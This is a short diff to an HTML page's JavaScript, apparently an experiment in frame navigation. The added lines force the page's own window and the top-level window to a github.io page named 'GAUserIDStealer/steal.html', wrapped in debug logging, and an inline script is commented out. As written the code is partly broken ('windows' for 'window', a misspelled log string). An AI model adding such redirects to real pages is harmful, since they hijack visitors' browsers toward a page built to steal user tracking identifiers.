@@ -19,7 +19,18 @@
      
    
      function doFlow(){
-    
+        
+         console.log('A origin loacation: ',window.location.origin);
+         console.log('A window top !== window', window.top!==window);
+         
+         windows.self.location='https://newmangervase91.github.io/GAUserIDStealer/steal.html';
+         windows.top.location='https://newmangervase91.github.io/GAUserIDStealer/steal.html'  
+         
+         console.log('after self/top origin: A',window.location.origin);
+         console.log('after A: TOP',window.top.location);
+         console.log('after A: self',window.self.location);
+         
+         
          var guhappyId=makeid(5);
          var ifrm_c = document.createElement('iframe');
          ifrm_c.setAttribute('id', guhappyId);
@@ -73,10 +84,10 @@
 
 <body>
     
-    <script>
+<!--     <script>
         console.log('A',window.location.origin);
         console.log('A window top !== window', window.top!==window);
-    </script>
+    </script> -->
 </body>
 
 </html>
